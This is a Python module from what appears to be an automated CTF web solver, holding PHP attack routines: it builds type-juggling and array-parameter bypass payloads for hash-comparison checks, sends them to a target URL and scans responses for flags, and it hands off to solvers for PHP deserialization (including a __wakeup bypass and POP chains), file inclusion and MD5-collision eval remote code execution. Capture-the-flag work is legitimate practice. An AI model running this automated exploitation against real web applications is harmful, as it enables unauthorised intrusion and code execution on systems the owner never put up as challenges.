"""yang_web.core.url_analyzer._attacks 子模块 _php_rce（自 _attacks.py 拆分，请勿手工重排）。"""

from urllib.parse import urlparse, parse_qs, unquote, urlencode, urlunparse, quote
from urllib.request import Request, urlopen
from typing import List, Dict, Tuple, Optional, Callable
import re
import time
import html as _html
from .._engines import (AdaptiveScheduler, ConcurrentEngine, execute_attack)
from .._http import (FLAG_RE, USER_AGENT, send_request)





def _execute_php_bypass(url: str, bypass_plan: Dict,
                       on_progress=None, on_found=None) -> Dict:
    """Execute PHP multi-layer condition bypass.
    
    Constructs GET/POST params from the bypass plan and sends the request.
    """
    t0 = time.time()
    get_params = bypass_plan.get('get_params', {})
    post_params = bypass_plan.get('post_params', {})
    
    if on_progress:
        try:
            on_progress('bypass', f'{bypass_plan.get("solved_layers",0)}/{bypass_plan.get("total_layers",0)}层', '构建绕过payload...')
        except Exception:
            pass
    
    # Build URL with GET params
    from urllib.parse import urlencode, urlparse, urlunparse
    parsed = urlparse(url)
    get_query = dict(parse_qs(parsed.query, keep_blank_values=True))
    
    # Build POST body with manual encoding (support bracket notation)
    post_parts = []
    for key, val in post_params.items():
        if val == '__ARRAY__':
            # Array params for sha1 collision: qw->qw[]=a, yxx->yxx[]=b
            if key == '__ARRAY_PARAMS__':
                post_parts.append(('qw[]', 'a'))
                post_parts.append(('yxx[]', 'b'))
        elif val == '__ANY__':
            post_parts.append((key + '[]', 'a'))
        elif val == '__POST_DOT_KEY__':
            # Dot key bypass: send bracket notation
            post_parts.append((key, 'Happy to see you!'))
        else:
            post_parts.append((key, val))
    
    # Build URL with GET params (including bypass params)
    from urllib.parse import quote
    get_list = []
    for k, vals in get_query.items():
        for v in vals:
            get_list.append(f'{k}={quote(v, safe="")}')
    for k, v in get_params.items():
        get_list.append(f'{k}={quote(v, safe="")}')
    
    if get_list:
        full_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                parsed.params, '&'.join(get_list), parsed.fragment))
    else:
        full_url = url
    
    # Encode POST body
    post_body = '&'.join(f'{quote(k, safe="")}={quote(v, safe="")}' for k, v in post_parts).encode('utf-8')
    
    if on_progress:
        try:
            on_progress('bypass', '发送绕过请求', f'GET: {len(get_params)} params, POST: {len(post_parts)} params')
        except Exception:
            pass
    
    # Send request
    resp = send_request(full_url, method='POST' if post_body else 'GET',
                        post_data=post_body if post_body else None)
    
    elapsed = int((time.time() - t0) * 1000)
    
    if resp.get('ok'):
        body = resp.get('body', '')
        # Search for flag patterns
        flags = FLAG_RE.findall(body)
        if flags:
            flag = flags[0]
            if on_found:
                try:
                    on_found(flag)
                except Exception:
                    pass
            if on_progress:
                try:
                    on_progress('flag', 'FLAG!', flag[:60])
                except Exception:
                    pass
            return {
                'flag': flag,
                'vuln_confirmed': [{'type': 'PHP_BYPASS', 'method': 'GET+POST',
                                     'payload': str(get_params) + ' | ' + str(post_parts)}],
                'attacks_run': 1,
                'stages': ['php_bypass', 'flag_found'],
                'timing_ms': elapsed,
            }
        
        # No flag found, check response text
        text = _html.unescape(re.sub(r'<[^>]+>', '', body))
        idx = text.find('?>')
        text = text[idx+2:].strip() if idx > 0 else text[:200]
        if on_progress:
            try:
                on_progress('bypass', '响应', text[:80])
            except Exception:
                pass
    
    return {
        'flag': None,
        'vuln_confirmed': [],
        'attacks_run': 1,
        'stages': ['php_bypass', 'no_flag'],
        'timing_ms': elapsed,
    }



# ============================================================================
#  Attack Guides
# ============================================================================

def _try_php_unserialize_exploit(url, results, fingerprint, on_progress=None, on_found=None):
    """v3.6: PHP 反序列化漏洞自动求解 — 委托给 php_unserialize 模块.
    
    支持的题型变体:
        - 基础验证 (class 属性对比)
        - __wakeup 绕过 (CVE-2016-7124)
        - == 弱类型绕过 (bool/int)
        - private/protected 属性编码
        - 简单 POP 链 (__destruct → 危险函数)
    """
    try:
        from ...php_unserialize import auto_solve
    except ImportError:
        from yang_web.core.php_unserialize import auto_solve

    return auto_solve(url, on_progress=on_progress, on_found=on_found)


# ═══════════════════════════════════════════════════════════
#  PHP File Inclusion General Solver (v3.7)
# ═══════════════════════════════════════════════════════════

def _try_php_lfi_exploit(url, results, fingerprint, on_progress=None, on_found=None):
    """PHP 文件包含漏洞自动检测 — 委托给 php_lfi 通用引擎."""
    from yang_web.core.php_lfi import auto_solve as lfi_auto_solve

    def _emit(stage, item, status):
        if on_progress:
            try:
                on_progress(stage, item, status)
            except Exception:
                pass

    _emit('php_lfi', 'running', 'php_lfi 通用求解器 v1.0')

    result = lfi_auto_solve(url, on_progress=_emit)
    if result and result.get('flag'):
        if on_found:
            try:
                on_found(result['flag'])
            except Exception:
                pass
        return {
            'flag': result['flag'],
            'vuln_confirmed': [{
                'type': 'PHP_FILE_INCLUSION',
                'param': result.get('param'),
                'path': result.get('path'),
                'strategy': result.get('strategy'),
            }],
        }
    return None



# ═══════════════════════════════════════════════════════════
#  PHP MD5 Collision + eval RCE (v3.8)
# ═══════════════════════════════════════════════════════════

def _try_php_eval_rce_exploit(url, results, fingerprint, on_progress=None, on_found=None):
    """PHP MD5 碰撞 + eval() RCE 自动检测与利用.
    
    薄包装，委托给 php_eval_rce 通用引擎.
    """
    def _progress(msg):
        if on_progress:
            on_progress('PHP-EvalRCE', msg, '')
    
    from yang_web.core.php_eval_rce import auto_solve as eval_auto_solve
    result = eval_auto_solve(url, on_progress=_progress)
    
    if result and result.get('flag'):
        if on_found:
            on_found('PHP-EvalRCE', result['flag'], result)
        return {
            'flag': result['flag'],
            'success': True,
            'stages': ['php_eval_rce'],
            'findings': [{
                'type': 'php_eval_rce',
                'strategy': result.get('strategy'),
                'status': result.get('status'),
            }],
        }
    return None
